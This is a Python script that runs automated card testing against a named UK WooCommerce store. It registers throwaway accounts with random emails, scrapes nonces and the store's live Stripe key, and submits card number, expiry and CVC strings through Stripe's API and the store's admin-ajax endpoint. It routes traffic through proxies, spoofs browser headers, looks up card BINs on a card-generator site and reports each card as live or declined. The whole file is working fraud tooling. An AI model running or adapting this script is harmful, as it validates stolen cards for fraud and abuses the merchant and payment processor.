import random
import string
from datetime import datetime
import hashlib
import json
import os
import re
import requests
import uuid

# ========================================
# CONFIGURATION
# ========================================
BASE_URL = "https://www.jumilondon.com"
CARD_COUNTRY = "UK"

# ========================================
# PAYMENT METHOD ADDER CLASS
# ========================================
class PaymentMethodAdder:
    """Handles the complete flow of adding payment methods to WooCommerce for Jumi London"""
    
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if proxy:
            self.session.proxies = format_proxy(proxy)
        self.stripe_key = None
        self.email = None
        self.password = None
        self.proxy_str = proxy

    def generate_random_account(self):
        """Generate random email and password for registration"""
        rand_id = str(uuid.uuid4())[:8]
        self.email = f"user_{rand_id}@tmail.com"
        chars = string.ascii_letters + string.digits + "!@#$"
        self.password = ''.join(random.choice(chars) for _ in range(12)) + "1aA!"
        print(f"🎲 Generated random account: {self.email}")
        return self.email, self.password

    def get_registration_nonce(self):
        """Get registration nonce from my-account page"""
        print("🔄 Getting registration nonce...")
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/', headers=headers, timeout=15)
            
            if response.status_code == 200:
                match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', response.text)
                if match:
                    nonce = match.group(1)
                    print(f"✅ Registration nonce extracted: {nonce}")
                    return nonce
                
                print("❌ Could not extract woocommerce-register-nonce")
                return None
            else:
                print(f"❌ Failed to load my-account page: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Error getting registration nonce: {e}")
            return None

    def register(self, nonce):
        """Registers a new account"""
        if not self.email or not self.password:
            self.generate_random_account()

        print(f"🔄 Registering with email: {self.email}...")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': self.base_url,
            'priority': 'u=0, i',
            'referer': f'{self.base_url}/my-account/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }
        
        data = {
            'email': self.email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': f'{self.base_url}/',
            'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': headers['user-agent'],
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/my-account/',
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200 or 'My account' in response.text:
                print("✅ Registration successful!")
                return True
            else:
                print(f"❌ Registration failed with status code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Error during registration: {e}")
            return False

    def extract_stripe_key_and_ajax_nonce(self):
        """Extract Stripe key and AJAX nonce from payment pages"""
        print("🔄 Extracting Stripe key and AJAX nonce...")
        
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'referer': f'{self.base_url}/my-account/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers)
            
            if response.status_code == 200:
                stripe_match = re.search(r'"key"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"', response.text)
                if stripe_match:
                    self.stripe_key = stripe_match.group(1)
                    print(f"✅ Stripe key extracted: {self.stripe_key[:20]}...")
                
                ajax_match = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', response.text)
                ajax_nonce = ajax_match.group(1) if ajax_match else None
                
                if ajax_nonce:
                    print(f"✅ AJAX nonce extracted: {ajax_nonce}")
                
                return self.stripe_key, ajax_nonce
            
            print(f"❌ Failed to load payment method page: {response.status_code}")
            return None, None
                
        except Exception as e:
            print(f"❌ Error extracting data: {e}")
            return None, None

    def create_stripe_payment_method(self, card_data):
        """Create a payment method using Stripe API"""
        print("🔄 Creating Stripe payment method...")
        
        if not self.stripe_key:
            return None
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }
        
        card_number = card_data.get('number', '').replace(' ', '+')
        
        data = (
            f"type=card&card[number]={card_number}&card[cvc]={card_data.get('cvc', '')}"
            f"&card[exp_year]={card_data.get('exp_year', '')}&card[exp_month]={card_data.get('exp_month', '')}"
            f"&allow_redisplay=unspecified&billing_details[address][country]={card_data.get('country', 'UK')}"
            f"&pasted_fields=number&payment_user_agent=stripe.js%2F851131afa1%3B+stripe-js-v3%2F851131afa1%3B+payment-element%3B+deferred-intent"
            f"&referrer={self.base_url}&time_on_page=23545&key={self.stripe_key}&_stripe_version=2024-06-20"
        )
        
        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                payment_method_id = response.json().get('id')
                print(f"✅ Stripe payment method created: {payment_method_id}")
                return payment_method_id
            
            print(f"❌ Failed to create Stripe payment method: {response.text}")
            return None
                
        except Exception as e:
            print(f"❌ Error creating Stripe payment method: {e}")
            return None

    def add_payment_method_to_account(self, payment_method_id, ajax_nonce):
        """Add the payment method to WooCommerce account"""
        print(f"🔄 Adding payment method to account...")
        
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'referer': f'{self.base_url}/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/wp-admin/admin-ajax.php',
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    setup_intent_id = result.get('data', {}).get('id')
                    print(f"✅ Payment method added successfully!")
                    return True, setup_intent_id, "Payment method added successfully"
                
                error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                print(f"❌ Failed to add payment method: {error_msg}")
                return False, None, error_msg
            
            return False, None, f"Error adding payment method: Status {response.status_code}"
                
        except Exception as e:
            print(f"❌ Error adding payment method: {e}")
            return False, None, str(e)

    def run(self, card_data):
        """Main execution flow"""
        print("=" * 60)
        print("🚀 Starting Payment Method Addition Process")
        print("=" * 60)
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Target: {self.base_url}")
        if self.proxy_str:
            print(f"Proxy: {self.proxy_str}")
        
        self.generate_random_account()
        print(f"Email: {self.email}")
        print(f"Card: {card_data.get('number', 'N/A')}")
        print("=" * 60)

        self.session.cookies.clear()
        
        nonce = self.get_registration_nonce()
        if not nonce:
            print("\n💥 Failed to get registration nonce!")
            return None, None, False, "Failed to get registration nonce"

        if not self.register(nonce):
            print("\n💥 Failed to register!")
            return None, None, False, "Account registration failed"
        
        stripe_key, ajax_nonce = self.extract_stripe_key_and_ajax_nonce()
        if not self.stripe_key or not ajax_nonce:
            print("\n💥 Failed to extract keys/nonces!")
            return None, None, False, "Failed to extract Stripe keys"
        
        payment_method_id = self.create_stripe_payment_method(card_data)
        if not payment_method_id:
            print("\n💥 Failed to create payment method!")
            return None, None, False, "Failed to create payment method"
        
        success, setup_intent_id, message = self.add_payment_method_to_account(payment_method_id, ajax_nonce)
        
        if success:
            print("\n" + "=" * 60)
            print("🎉 Payment Method Addition Completed Successfully!")
            print("=" * 60)
            return payment_method_id, setup_intent_id, True, message
        
        print("\n💥 Failed to add payment method to account!")
        return payment_method_id, None, False, message

# ========================================
# HELPER FUNCTIONS
# ========================================

def advanced_luhn_checksum(card_number):
    """Luhn algorithm for card number validation"""
    def digits_of(n):
        return [int(d) for d in str(n)]

    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]

    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))

    return checksum % 10

def is_valid_card(card_number):
    """Validate card number using Luhn algorithm"""
    return advanced_luhn_checksum(card_number) == 0

def parse_card_details(auth_string):
    """Parse card details from auth parameter"""
    parts = auth_string.split('|')
    
    if len(parts) != 4:
        return None
    
    card_number = parts[0].strip()
    exp_month = parts[1].strip().zfill(2)
    exp_year = parts[2].strip()
    cvc = parts[3].strip()
    
    if len(exp_year) == 2:
        exp_year = '20' + exp_year
    
    return {
        'number': card_number,
        'exp_month': exp_month,
        'exp_year': exp_year,
        'cvc': cvc,
        'country': CARD_COUNTRY
    }

def get_bin_info(card_number):
    """Get BIN information for a card"""
    try:
        bin_number = str(card_number)[:6]
        print(f"🔍 Fetching BIN info for: {bin_number}")
        response = requests.get(f'https://cc-gen-lime.vercel.app/bin/{bin_number}', timeout=5)
        
        if response.status_code == 200:
            bin_data = response.json()
            if bin_data.get('bin'):
                print(f"✅ BIN info found: {bin_data.get('scheme', 'N/A')}")
                return {
                    'issuer': bin_data.get('bank', 'N/A'),
                    'brand': bin_data.get('scheme', 'N/A'),
                    'country': bin_data.get('country', 'N/A'),
                    'level': bin_data.get('tier', 'N/A'),
                    'type': bin_data.get('type', 'N/A')
                }
        
        print("❌ BIN info not found")
        return None
    except Exception as e:
        print(f"⚠️ Could not fetch BIN info: {e}")
        return None

def format_proxy(proxy_str):
    """Format proxy string from ip:port:user:pass to http://user:pass@ip:port"""
    if not proxy_str:
        return None
    try:
        parts = proxy_str.strip().split(':')
        if len(parts) != 4:
            return None
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    except:
        return None

# ========================================
# ENDPOINT HANDLER
# ========================================
def handle_endpoint(auth, proxy=None):
    """Main endpoint handler for Jumi London registration-based validation"""
    if not auth:
        return {'success': False, 'error': 'Missing auth parameter'}, 400
    
    card_data = parse_card_details(auth)
    if not card_data:
        return {'success': False, 'error': 'Invalid card details format'}, 400
    
    try:
        print(f"🔐 Validating card: {card_data['number'][:6]}******{card_data['number'][-4:]}")
        bin_info = get_bin_info(card_data['number'])
        
        if not is_valid_card(card_data['number']):
            return {
                'card': f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}",
                'gateway': 'Stripe Registration',
                'status': 'error',
                'message': 'Invalid card number (Failed Luhn validation)',
                'bin_info': bin_info if bin_info else {}
            }, 200
        
        print("✅ Card passed Luhn validation")
        
        adder = PaymentMethodAdder(base_url=BASE_URL, proxy=proxy)
        payment_method_id, setup_intent_id, success, message = adder.run(card_data=card_data)
        
        result = {
            'card': f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}",
            'gateway': 'Stripe Registration',
            'status': 'success' if success else 'declined',
            'message': message,
            'payment_method_id': payment_method_id,
            'setup_intent_id': setup_intent_id,
            'bin_info': bin_info if bin_info else {}
        }
        
        return result, 200
            
    except Exception as e:
        return {'success': False, 'error': str(e)}, 500
